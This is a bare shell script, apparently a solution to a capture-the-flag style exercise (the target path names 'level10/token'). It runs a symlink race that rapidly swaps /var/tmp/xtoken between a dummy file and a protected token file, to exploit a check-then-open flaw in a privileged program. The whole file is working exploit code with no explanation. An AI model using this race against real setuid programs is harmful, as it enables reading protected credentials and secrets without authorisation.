#!/bin/sh

touch /var/tmp/fake

while true
do
	ln -fs /var/tmp/fake /var/tmp/xtoken
	ln -fs /home/user/level10/token /var/tmp/xtoken
done
